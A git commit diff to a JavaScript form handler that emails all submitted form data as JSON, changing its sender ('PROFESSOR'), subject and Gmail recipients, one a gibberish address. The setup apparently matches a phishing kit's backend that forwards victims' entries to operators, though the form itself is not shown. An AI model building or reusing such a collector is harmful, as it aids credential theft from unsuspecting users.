0427bd57219bbd88515dbbe9d5bca32d09dfce55
hatyarbusyhon <simthlora822@gmail.com>
2026-03-24 20:06:19 +0500

    Update and rename 1.js to abd.js

--- abd.js
+++ abd.js
@@ -36,9 +36,9 @@ export default async function handler(req, res) {
 
   try {
     await transporter.sendMail({
-      from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,hinijffkhvsxvcxdhgdtu@gmail.com",
-      subject: "Hasnain",
+      from: `"PROFESSOR" <adsmenigar@gmail.com>`,
+      to: "abdullahnizamani330@gmail.com,adsmenigar@gmail.com,",
+      subject: "abdullah",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
